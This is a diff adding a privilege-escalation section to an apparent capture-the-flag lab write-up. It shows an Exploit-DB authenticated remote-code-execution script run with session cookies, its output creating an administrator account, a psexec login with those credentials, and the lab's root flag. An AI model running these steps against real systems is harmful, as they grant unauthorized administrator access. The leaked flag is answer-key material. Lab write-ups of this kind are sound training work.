@@ -85,3 +85,32 @@ Nmap done: 1 IP address (1 host up) scanned in 17.26 seconds
 	* Strangely it didn't work for me at first and I was getting really frustrated, but when I came back the next day (and I assume the machine was reset), it worked. So maybe reset the machine if you run into the same issue
 
 * Now we can log in!
+
+
+### privesc
+* Now that we have the login credentials, I remembered that searchsploit had a module for authenticated remote code execution
+* For some reason the one on my computer wasn't working, so I ended up copying the code from [here](https://www.exploit-db.com/exploits/46527) to `exploit.sh`
+* It turns out we have to have some cookie information for the exploit to work. I just went into the `network` section of inspect element to get it.
+* Here's the complete command: `./exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.1911846024.1606031704; _gid=GA1.4.667691852.1606031704; OCTOPUS1813713946=e0ExRkMzQzcxLUY3MzAtNDJBMS1BNEU2LTBDRjFDREExMEUzRn0;"`
+* When that finishes executing, it gives the following output:
+```
+
+ [*] file created 
+ [*] sending notification wait....
+
+ [*] adding a new user 'pentest' with password 'P3nT3st' 
+ [*] sending notification wait....
+
+ [*] adding a user pentest to the administrators group 
+ [*] sending notification wait....
+
+
+ [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
+```
+* A user in the administrators group with the username `pentest` and the password `P3nT3st!`
+* After what must have been an hour of fiddling with tools, I finally figured out how to log in with the credentials
+	* [this](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/) blog helped out a lot
+* A script called `psexec` lets us log in with the command `python3 psexec.py pentest:'P3nT3st!'@10.10.10.152`
+* Once in the machine, we can cd over to '\Users\Administrator\Desktop` and print the file with `more root.txt`
+* The root flag is `3018977fb944bf1878f75b879fba67cc`
+  
